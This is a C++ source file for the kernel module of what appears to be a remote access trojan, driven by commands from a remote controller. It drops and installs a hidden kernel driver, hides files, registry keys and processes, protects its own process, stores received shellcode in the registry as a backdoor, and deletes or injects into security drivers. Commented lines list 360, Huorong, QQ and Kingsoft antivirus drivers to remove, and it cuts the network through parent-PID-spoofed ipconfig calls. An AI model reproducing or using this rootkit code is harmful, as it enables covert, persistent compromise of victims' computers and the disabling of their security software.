// ShellManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "KernrlManager.h"

#include <Setupapi.h>
#pragma comment(lib, "Setupapi.lib")

#include "C_Hidden64.h"
#include "CloseNet.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKernelManager::CKernelManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = FALSE;
	BYTE lpBuffer = TOKEN_KERNEL;
	Send((LPBYTE)&lpBuffer, 1);
	m_context = NULL;
	m_buser = TRUE;
}

CKernelManager::~CKernelManager()
{
	if (!m_buser) return;
	if (m_context)
		Hid_Destroy(m_context);
}



void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	switch (lpBuffer[0])
	{

	case COMMAND_KERNEL_INIT: {
		if (lpBuffer[1] == 0)
		{
			Initialize();
			return;
		}
		else
		{
			SetInternetStatus(false);//断网
			Initialize();
			SetInternetStatus(true);//断网
		}
		
	}break;
	case COMMAND_KERNEL_GETSTATE:GetState(); break;
	case COMMAND_KERNEL_SETSTATE_CONTINUE:SetState(StateEnabled); break;
	case COMMAND_KERNEL_SETSTATE_STOP:SetState(StateDisabled); break;
	case COMMAND_KERNEL_RUNCOMMAND:
	{
		RUNCOMMAND* p_runcommand = (RUNCOMMAND*)lpBuffer;
		runcommand(p_runcommand->argc, p_runcommand->Command);
	}
	break;
	case COMMAND_KERNEL_DELCOMMAND:
	{
		RUNCOMMAND* p_runcommand = (RUNCOMMAND*)lpBuffer;
		delcommand(p_runcommand->argc, p_runcommand->Command);
	}
	break;
	case COMMAND_KERNEL_WRITERCOMMAND:
	{
		RUNCOMMAND* p_runcommand = (RUNCOMMAND*)lpBuffer;
		writercommand(p_runcommand->argc, p_runcommand->Command);
	}
	break;
	case COMMAND_KERNEL_BACKDOOR:
	{
		int ShellcodeSize= nSize-1;
		BYTE* Shellcode= lpBuffer+1;
		//读取参数
		HKEY hKey;
		DWORD dwType = REG_BINARY;
		DWORD infoSize = 0;
		Info MyInfo;
		::RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE"), 0, KEY_WOW64_64KEY|KEY_READ, &hKey);

			RegQueryValueEx(hKey, _T("IpDates_info"), NULL, &dwType, NULL, &infoSize);
			if (infoSize != sizeof(Info))
			{
				SendReturnInfo(COMMANDERROR, _T("读取shellcode配置失败--1"));
				return ;
			}
		
			if (::RegQueryValueEx(hKey, _T("IpDates_info"), 0, &dwType, (LPBYTE)&MyInfo, &infoSize) != ERROR_SUCCESS)
			{
				SendReturnInfo(COMMANDERROR, _T("读取shellcode配置失败--2"));
				return ;
			}


		// 
		//改参数
		DWORD dwOffset = -1;
		dwOffset = memfind((char*)Shellcode, "denglupeizhi", ShellcodeSize, 0);
		if (dwOffset != -1)
		{
			SendReturnInfo(COMMANDERROR, _T("修改shellcode配置"));
			memcpy((char*)Shellcode + dwOffset, (char*)&MyInfo, sizeof(Info));
		}


		//写入注册表
		
		::RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE"), 0, KEY_WOW64_64KEY|KEY_SET_VALUE, &hKey);
		::RegDeleteValue(hKey, _T("IpDates"));
		::RegSetValueEx(hKey, _T("IpDates"), 0, REG_BINARY, (unsigned char*)Shellcode, ShellcodeSize);
		::RegCloseKey(hKey);

		SendReturnInfo(COMMANDERROR, _T("shellcode写入成功"));

	}
	break;
	case COMMAND_KERNEL_DEL:
	{
		runcommand(20, (WCHAR*)(lpBuffer+1));
	}
	break;
	case COMMAND_KERNEL_INJECT:
	{
		runcommand(21, (WCHAR*)(lpBuffer + 1));
	}
	break;
	case COMMAND_KERNEL_SETSTATE_PROCESS:
	{
		TCHAR szPath[MAX_PATH * 2];
		GetModuleFileName(NULL, szPath, sizeof(szPath));
		runcommand(0, szPath);
		writercommand(0, szPath);
	}
	break;
	default:
		break;
	}
}


void CKernelManager::Initialize()
{
	

	//写出驱动
	TCHAR szPath[MAX_PATH * 2];
	SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, szPath);
	lstrcatW(szPath, _T("\\23423.txt"));
	HANDLE	hFile = CreateFile(szPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		SendReturnInfo(INITSUC, _T("写出驱动失败"));
		return;
	}
	DWORD dwBytesWrite = 0;
	//if (IsWindowsX64())
		WriteFile(hFile, Hidden64MyFileBuf, Hidden64MyFileSize, &dwBytesWrite, NULL);
		CloseHandle(hFile);
	
	/*else
		WriteFile(hFile, HiddenMyFileBuf, HiddenMyFileSize, &dwBytesWrite, NULL);*/

	//安装驱动

	DWORD dwTag = 1;
	SC_HANDLE hSCMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	::MoveFile(_T("23423.txt"), _T("kernelquick.sys"));
	SC_HANDLE hService = CreateService(hSCMgr, TEXT("kernelquick"), TEXT("kernelquick"), SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, szPath, NULL, NULL, NULL, NULL, NULL);
	if (GetLastError() == ERROR_SERVICE_EXISTS) //如果服务已经存在,直接打开
	{
		hService = OpenService(hSCMgr, TEXT("kernelquick"), SERVICE_START);
	}

	if (NULL == hService) {
		SendReturnInfo(INITUNSUC, _T("创建服务失败"));
		return;
	}
	if (NULL == hSCMgr) {
		SendReturnInfo(INITUNSUC, _T("创建服务中心管理器句柄失败"));
		return;
	}

	writercommand(0, szPath);

	GetModuleFileName(NULL, szPath, sizeof(szPath));
	writercommand(5, szPath);
	
	if (StartService(hService, 0, NULL))
		SendReturnInfo(INITUNSUC, _T("驱动运行成功"));
	else
	{
		GetState();
	}
	CloseServiceHandle(hSCMgr);
	CloseServiceHandle(hService);
	runcommand(5, szPath);

	////360
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\DsArk64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360AntiSteal64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360FsFlt.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360netmon.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360AntiAttack64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360AntiHijack64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360AntiExploit64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360AntiHacker64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\BAPIDRV64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360reskit64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360qpesv64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360Sensor64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\360Box64.sys");
	//runcommand(20, L"C:\\Program Files (x86)\\360\\360Safe\\deepscan\\AtS64.sys");

	////火绒
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\sysdiag_win10.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\hrwfpdrv_win10.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\sysdiag.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\hrwfpdrv.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\hrdevmon.sys");

	////QQ
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\TAOAcceleratorEx64_ev.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\TAOAccelerator64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\qmbsecx64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\TFsFltX64_ev.sys");

	////金山
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\ksapi64.sys");
	//runcommand(20, L"C:\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\security\\kxescan\\kdhacker64_ev.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\kavbootc64_ev.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\KAVBootC64.sys");
	//runcommand(20, L"C:\\Windows\\System32\\drivers\\kisknl.sys");
	//runcommand(20, L"C:\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\security\\ksde\\kisnetflt64.sys");
	//runcommand(20, L"C:\\program files(x86)\\kingsoft\kingsoft antivirus\\security\\ksnetm\\kisnetm64.sys");

	
	DWORD dwType = SERVICE_KERNEL_DRIVER;
	 dwTag = 1;
	DWORD dwStart = SERVICE_DEMAND_START;
	SHSetValue(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\services\\kernelquick", TEXT("Group"), REG_EXPAND_SZ, TEXT("System Reserved"), sizeof(TCHAR) * (lstrlen(TEXT("System Reserved")) + 1));
	SHSetValue(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\services\\kernelquick", TEXT("Start"), REG_DWORD, &dwStart, sizeof(DWORD));
	SHSetValue(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\services\\kernelquick", TEXT("Type"), REG_DWORD, &dwType, sizeof(DWORD));
	SHSetValue(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\services\\kernelquick", TEXT("Tag"), REG_DWORD, &dwTag, sizeof(DWORD));

	 dwStart = SERVICE_SYSTEM_START;
	
	 SHSetValue(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\services\\kernelquick", TEXT("Start"), REG_DWORD, &dwStart, sizeof(DWORD));
}



void CKernelManager::SetRegvalue(TCHAR* name, TCHAR*val,int nSize)
{
	HKEY hKey;
	::RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\Services\\kernelquick", 0, KEY_SET_VALUE, &hKey);
	::RegDeleteValue(hKey, name);
	DWORD IpDatesize = nSize ;
	if (ERROR_SUCCESS != ::RegSetValueEx(hKey, name, 0, REG_SZ, (unsigned char*)val, IpDatesize))
	{
		::RegCloseKey(hKey);
	}
}

void  CKernelManager::GetState()
{
	HidActiveState state;
	HidStatus status;
	if (!m_context) GetContext();
	if (!m_context)
	{
		SendReturnInfo(COMMANDERROR, _T("获取驱动失败,需要安装驱动"));
		return;
	}
	status = Hid_GetState(GetContext(), &state);
	if (!HID_STATUS_SUCCESSFUL(status))
	{
		SendReturnInfo(COMMANDERROR, _T("查询状态被拒绝"));
	}

	if (state == HidActiveState::StateEnabled)
	{
		SendReturnInfo(COMMANDERROR, _T("驱动启用中"));
	}
	else
	{
		SendReturnInfo(COMMANDERROR, _T("驱动停用中"));
	}
}

void CKernelManager::SetState(HidActiveState state)
{
	HidStatus status;
	if (!m_context) GetContext();
	if (!m_context)
	{
		SendReturnInfo(COMMANDERROR, _T("获取驱动失败,需要安装驱动"));
		return;
	}
	status = Hid_SetState(GetContext(), (state ? HidActiveState::StateEnabled : HidActiveState::StateDisabled));
	if (!HID_STATUS_SUCCESSFUL(status))
	{
		SendReturnInfo(COMMANDERROR, _T("查询状态被拒绝"));
	}
	else
	{
		SendReturnInfo(COMMANDERROR, _T("设置成功"));
	}
}

//判断操作系统是否为64位
BOOL CKernelManager::IsWindowsX64()
{
	typedef void (WINAPI* PGNSI)(LPSYSTEM_INFO);
	SYSTEM_INFO si = { 0 };
	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	PGNSI pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else
		GetSystemInfo(&si);

	if (PROCESSOR_ARCHITECTURE_IA64 == si.wProcessorArchitecture ||
		PROCESSOR_ARCHITECTURE_AMD64 == si.wProcessorArchitecture)
	{
		return TRUE;
	}

	return FALSE;
}

void CKernelManager::SendReturnInfo(BYTE mode, TCHAR* info)
{
	RETURNINFO* P_returninfo = new RETURNINFO;
	ZeroMemory(P_returninfo, sizeof(RETURNINFO));
	P_returninfo->Token = TOKEN_KERNEL_RETURNINFO;
	P_returninfo->mode = mode;
	memcpy(P_returninfo->info, info, (lstrlen(info) * 2 > 2046) ? 2046 : lstrlen(info) * 2 + 2);
	Send((BYTE*)P_returninfo, sizeof(RETURNINFO));
	SAFE_DELETE(P_returninfo);
}

HidRegRootTypes CKernelManager::GetRegType(wstring& path)
{
	static wchar_t regHKLM[] = L"HKLM\\";
	static wchar_t regHKCU[] = L"HKCU\\";
	static wchar_t regHKU[] = L"HKU\\";
	static wchar_t regHKLM2[] = L"HKEY_LOCAL_MACHINE\\";
	static wchar_t regHKCU2[] = L"HKEY_CURRENT_USER\\";
	static wchar_t regHKU2[] = L"HKEY_USERS\\";

	if ((path.compare(0, _countof(regHKLM) - 1, regHKLM) == 0) || (path.compare(0, _countof(regHKLM2) - 1, regHKLM2) == 0))
		return HidRegRootTypes::RegHKLM;
	else if ((path.compare(0, _countof(regHKCU) - 1, regHKCU) == 0) || (path.compare(0, _countof(regHKCU2) - 1, regHKCU2) == 0))
		return HidRegRootTypes::RegHKCU;
	else if ((path.compare(0, _countof(regHKU) - 1, regHKU) == 0) || (path.compare(0, _countof(regHKU2) - 1, regHKU2) == 0))
		return HidRegRootTypes::RegHKU;
	else
		return Reg_error;

}
HidRegRootTypes CKernelManager::GetTypeAndNormalizeRegPath(std::wstring& regPath)
{
	HidRegRootTypes type = GetRegType(regPath);
	size_t pos = regPath.find(L"\\");
	if (pos == wstring::npos)
		return Reg_error;

	regPath = std::move(wstring(regPath.c_str() + pos + 1));
	return type;
}
HidContext CKernelManager::GetContext()
{
	const wchar_t* deviceName = nullptr;
	if (!m_context)
		Hid_Initialize(&m_context, deviceName);
	return m_context;
}


void CKernelManager::runcommand(int argc, TCHAR* Command)
{
	HidStatus status;
	HidObjId objId;
	std::wstring    m_path = Command;
	HidRegRootTypes m_regRootType;
	if (!m_context) GetContext();
	if (!m_context)
	{
		SendReturnInfo(COMMANDERROR, _T("获取驱动失败,需要安装驱动"));
		return;
	}
	if (argc==6 || argc==7) return;

	switch (argc)
	{
	case 0: status = Hid_AddHiddenFile(GetContext(), m_path.c_str(), &objId);	break;
	case 1: status = Hid_AddHiddenDir(GetContext(), m_path.c_str(), &objId);	break;
	case 2:
	{
		m_regRootType = GetTypeAndNormalizeRegPath(m_path);
		if (m_regRootType == Reg_error)
		{
			SendReturnInfo(COMMANDERROR, _T("命令运行失败"));
			return;
		}
		status = Hid_AddHiddenRegKey(GetContext(), m_regRootType, m_path.c_str(), &objId);
	}
	break;
	case 3:
	{
		m_regRootType = GetTypeAndNormalizeRegPath(m_path);
		if (m_regRootType == Reg_error)
		{
			SendReturnInfo(COMMANDERROR, _T("命令运行失败"));
			return;
		}
		status = Hid_AddHiddenRegValue(GetContext(), m_regRootType, m_path.c_str(), &objId);
	}
	break;
	case 4:
	{
		HidProcId    m_procId;
		m_procId = _wtol(m_path.c_str());
		HidPsInheritTypes m_inheritType = InheritAlways;
		status = Hid_AttachProtectedState(GetContext(), m_procId, m_inheritType);
	}
	break;
	case 5:
	{
		bool         m_applyByDefault = true;
		HidPsInheritTypes m_inheritType = InheritAlways;
		status = Hid_AddProtectedImage(GetContext(), m_path.c_str(), m_inheritType, m_applyByDefault, &objId);
	}
	break;
	case 6:
	{
		HidProcId    m_procId;
		m_procId = _wtol(m_path.c_str());
		HidPsInheritTypes m_inheritType = InheritAlways;
		status = Hid_AttachHiddenState(GetContext(), m_procId, m_inheritType);
	}
	break;
	case 7:
	{
		bool         m_applyByDefault = true;
		HidPsInheritTypes m_inheritType = InheritAlways;
		status = Hid_AddHiddenImage(GetContext(), m_path.c_str(), m_inheritType, m_applyByDefault, &objId);
	}
	break;
	case 8:
		status = Hid_AddHiddenFilecomprise(GetContext(), m_path.c_str(), &objId);
		break;

	case 20:
		status = Hid_Del(GetContext(), Command, &objId);
		break;
	case 21:
		status = Hid_Inject(GetContext(), Command, &objId);
		break;
	default:
		break;
	}

	if (!HID_STATUS_SUCCESSFUL(status))
	{
		SendReturnInfo(COMMANDERROR, _T("命令运行失败"));
	}
	else
	{
		SendReturnInfo(COMMANDERROR, _T("命令运行成功"));
	}

}

void CKernelManager::delcommand(int argc, TCHAR* Command)
{
	HidStatus status;
	std::wstring    m_path = Command;
	if (!m_context) GetContext();
	if (!m_context)
	{
		SendReturnInfo(COMMANDERROR, _T("获取驱动失败,需要安装驱动"));
		return;
	}
	if (argc == 6 || argc == 7) return;
	switch (argc)
	{
	case 0: status = Hid_RemoveAllHiddenFiles(GetContext()); break;
	case 1: status = Hid_RemoveAllHiddenDirs(GetContext()); break;
	case 2: status = Hid_RemoveAllHiddenRegKeys(GetContext()); break;
	case 3: status = Hid_RemoveAllHiddenRegValues(GetContext()); break;
	case 4:
	{
		HidProcId    m_procId;
		m_procId = _wtol(m_path.c_str());
		status = Hid_RemoveProtectedState(GetContext(), m_procId);
	}
	break;
	case 5: status = Hid_RemoveAllProtectedImages(GetContext()); break;
	case 6: status = Hid_RemoveAllHiddenProcesses(GetContext()); break;
	case 7: status = Hid_RemoveAllHiddenProcesses(GetContext()); break;
	case 8: status = 0; break;
	default:
		break;
	}
	if (!HID_STATUS_SUCCESSFUL(status))
	{
		SendReturnInfo(COMMANDERROR, _T("取消命令运行失败"));
	}
	else
	{
		SendReturnInfo(COMMANDERROR, _T("取消命令运行成功"));
	}

}
//m_combo_main.InsertString(i++, _T("隐藏文件"));
//m_combo_main.InsertString(i++, _T("隐藏目录"));
//m_combo_main.InsertString(i++, _T("隐藏注册表项"));
//m_combo_main.InsertString(i++, _T("隐藏注册表值"));
//m_combo_main.InsertString(i++, _T("保护进程(pid)"));
//m_combo_main.InsertString(i++, _T("保护进程(路径)"));
//m_combo_main.InsertString(i++, _T("隐藏进程(pid)"));
//m_combo_main.InsertString(i++, _T("隐藏进程(路径)"));
void CKernelManager::writercommand(int argc, TCHAR* Command)
{
	vector<wstring> commands;
	const wchar_t* valueName;
	HidStatus status;
	wstring entry, normilized;
	std::wstring    m_path = Command;
	HidRegRootTypes m_regRootType;
	normilized.insert(0, m_path.size() + HID_NORMALIZATION_OVERHEAD, L'\0');
	if (argc == 6 || argc == 7) return;
	switch (argc)
	{
	case 0:
		valueName = L"KernelQuick_HideFsFiles";
		status = Hid_NormalizeFilePath(m_path.c_str(), const_cast<wchar_t*>(normilized.c_str()), normilized.size());
		break;
	case 1:
		valueName = L"KernelQuick_HideFsDirs";
		status = Hid_NormalizeFilePath(m_path.c_str(), const_cast<wchar_t*>(normilized.c_str()), normilized.size());
		break;
	case 2:
		valueName = L"KernelQuick_HideRegKeys";
		m_regRootType = GetTypeAndNormalizeRegPath(m_path);
		status = Hid_NormalizeRegistryPath(m_regRootType, m_path.c_str(), const_cast<wchar_t*>(normilized.c_str()), normilized.size());
		break;
	case 3:
		valueName = L"KernelQuick_HideRegValues";
		m_regRootType = GetTypeAndNormalizeRegPath(m_path);
		status = Hid_NormalizeRegistryPath(m_regRootType, m_path.c_str(), const_cast<wchar_t*>(normilized.c_str()), normilized.size());
		break;
	case 5:
		valueName = L"KernelQuick_ProtectedImages";
		status = Hid_NormalizeFilePath(m_path.c_str(), const_cast<wchar_t*>(normilized.c_str()), normilized.size());
		break;
	case 7:
		valueName = L"KernelQuick_HideImages";
		status = Hid_NormalizeFilePath(m_path.c_str(), const_cast<wchar_t*>(normilized.c_str()), normilized.size());
		break;
	case 8:
		status = 1;
		valueName = L"KernelQuick_hideFS_comprise";
		normilized = m_path;
		break;

	default:
		{
		SendReturnInfo(COMMANDERROR, _T("不添加。重启不知道PID，所以没意义"));
		return;
		}
	}

	if (!HID_STATUS_SUCCESSFUL(status))
	{
		SendReturnInfo(COMMANDERROR, _T("路径转换失败，查一查"));
		return;
	}


	entry += normilized.c_str();
	if (argc ==7)
	{
		entry += L";";
		entry += L"always";
	}

	if (!GetMultiStrValue(valueName, commands))
		SendReturnInfo(COMMANDERROR, _T("历史记录无"));

	commands.push_back(entry);
	if (!SetMultiStrValue(valueName, commands))
	{
		SendReturnInfo(COMMANDERROR, _T("写入配置失败"));
		return;
	}
	else
		SendReturnInfo(COMMANDERROR, _T("写入配置成功"));


}

bool CKernelManager::GetMultiStrValue(const wchar_t* name, std::vector<std::wstring>& strs)
{
	DWORD size = 0, type = REG_MULTI_SZ;
	shared_ptr<BYTE> buffer;
	LPWSTR bufferPtr;
	LONG status;
	HKEY m_hkey;
	strs.clear();
	std::wstring m_regConfigPath = L"System\\CurrentControlSet\\Services\\kernelquick";
	status = RegCreateKeyExW(HKEY_LOCAL_MACHINE, m_regConfigPath.c_str(), 0, NULL, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &m_hkey, NULL);
	if (status != ERROR_SUCCESS)
	{
		status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, m_regConfigPath.c_str(), 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &m_hkey);
		if (status != ERROR_SUCCESS)
			return false;
	}

	status = RegQueryValueExW(m_hkey, name, NULL, &type, NULL, &size);
	if (status != ERROR_SUCCESS)
	{
		if (status != ERROR_FILE_NOT_FOUND)
			return false;

		return false;
	}

	if (type != REG_MULTI_SZ)
		return false;

	if (size == 0)
		return false;

	buffer.reset(new BYTE[size + sizeof(WCHAR)]);
	memset(buffer.get(), 0, size + sizeof(WCHAR));

	status = RegQueryValueExW(m_hkey, name, NULL, &type, buffer.get(), &size);
	if (status != ERROR_SUCCESS)
		return false;

	bufferPtr = (LPWSTR)buffer.get();
	while (size > 1)
	{
		ULONG inx, delta = 0;
		ULONG len = size / sizeof(WCHAR);

		for (inx = 0; inx < len; inx++)
		{
			if (bufferPtr[inx] == L'\0')
			{
				delta = 1;
				break;
			}
		}

		if (inx > 0)
			strs.push_back(bufferPtr);

		size -= (inx + delta) * sizeof(WCHAR);
		bufferPtr += (inx + delta);
	}
	return true;
}


bool CKernelManager::SetMultiStrValue(const wchar_t* name, const std::vector<std::wstring>&strs)
{
	DWORD size = 0, offset = 0;
	shared_ptr<BYTE> buffer;
	LONG status;
	HKEY m_hkey;
	std::wstring m_regConfigPath = L"System\\CurrentControlSet\\Services\\kernelquick";
	status = RegCreateKeyExW(HKEY_LOCAL_MACHINE, m_regConfigPath.c_str(), 0, NULL, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &m_hkey, NULL);
	if (status != ERROR_SUCCESS)
	{
		status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, m_regConfigPath.c_str(), 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &m_hkey);
		if (status != ERROR_SUCCESS)
			return false;
	}

	for (auto it = strs.begin(); it != strs.end(); it++)
	{
		if (it->size() > 0)
			size += (DWORD)(it->size() + 1) * sizeof(wchar_t);
	}

	if (size == 0)
	{
		WCHAR value = 0;
		status = RegSetValueExW(m_hkey, name, NULL, REG_MULTI_SZ, (LPBYTE)&value, 2);
		if (status != ERROR_SUCCESS)
			return false;

		return false;
	}

	buffer.reset(new BYTE[size]);
	memset(buffer.get(), 0, size);

	for (auto it = strs.begin(); it != strs.end(); it++)
	{
		if (it->size() == 0)
			continue;

		DWORD strSize = (DWORD)(it->size() + 1) * sizeof(wchar_t);
		memcpy(buffer.get() + offset, it->c_str(), strSize);
		offset += strSize;
	}

	status = RegSetValueExW(m_hkey, name, NULL, REG_MULTI_SZ, buffer.get(), size);
	if (status != ERROR_SUCCESS)
		return false;
	return true;
}

int CKernelManager::memfind(const char* mem, const char* str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = (int)strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da)
			return i;
	}
	return -1;
}


BOOL CKernelManager::SetInternetStatus(bool enable)
{
#ifdef _WIN64
	if (enable)
	{
		DWORD DWMpid = GetPidUsingFilePath(L"C:\\Windows\\system32\\dwm.exe");
		MalSeclogonPPIDSpoofing(DWMpid, L"cmd /c start /min ipconfig /renew");
	}
	else
	{
		DWORD DWMpid = GetPidUsingFilePath(L"C:\\Windows\\system32\\dwm.exe");
		MalSeclogonPPIDSpoofing(DWMpid, L"cmd /c start /min ipconfig /release");
	}
#else
	
#endif
		Sleep(3000);
	return TRUE;




	//return 1;
	//HDEVINFO hDevInfo = INVALID_HANDLE_VALUE;
	//hDevInfo = SetupDiGetClassDevs(NULL, NULL, NULL, DIGCF_PRESENT | DIGCF_ALLCLASSES);
	//if (INVALID_HANDLE_VALUE == hDevInfo)
	//	return 1;
	//SP_DEVINFO_DATA DeviceInfoData = { sizeof(SP_DEVINFO_DATA) };
	//LPOLESTR guid;
	//char devName[128];
	//char instanceId[128];
	////函数返回一个SP_DEVINFO_DATA结构，该结构指定设备信息集中的设备信息元素。第三个参数为数据结构
	//for (int i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &DeviceInfoData); i++)
	//{
	//	//将 CLSID 转换为可打印字符字符串。不同的 CLSID 始终转换为不同的字符串。
	//	StringFromCLSID(DeviceInfoData.ClassGuid, &guid);
	//	//函数检索与类 GUID 关联的类名。
	//	SetupDiClassNameFromGuidA(&DeviceInfoData.ClassGuid, devName, 128, NULL);

	//	;		if (!strcmp(devName, "Net"))
	//	{
	//		//检索与设备信息元素关联的设备实例 ID。
	//		SetupDiGetDeviceInstanceIdA(hDevInfo, &DeviceInfoData, instanceId, 128, NULL);

	//		if (!strncmp(instanceId, "PCI", 3))
	//		{

	//			SP_PROPCHANGE_PARAMS params = { sizeof(SP_CLASSINSTALL_HEADER) };
	//			params.ClassInstallHeader.InstallFunction = DIF_PROPERTYCHANGE;
	//			params.Scope = DICS_FLAG_CONFIGSPECIFIC;
	//			//断开网络
	//			params.StateChange = enable ? DICS_ENABLE : DICS_DISABLE;

	//			params.HwProfile = 0;
	//			//为设备信息集或特定设备信息元素设置或清除类安装参数。
	//			SetupDiSetClassInstallParams(hDevInfo, &DeviceInfoData, (SP_CLASSINSTALL_HEADER*)&params, sizeof(SP_PROPCHANGE_PARAMS));
	//			//函数是DIF_PROPERTYCHANGE安装请求的默认处理程序。
	//			SetupDiChangeState(hDevInfo, &DeviceInfoData);
	//		}
	//	}
	//	CoTaskMemFree(guid);
	//}
	//SetupDiDestroyDeviceInfoList(hDevInfo);
	//return 0;
}
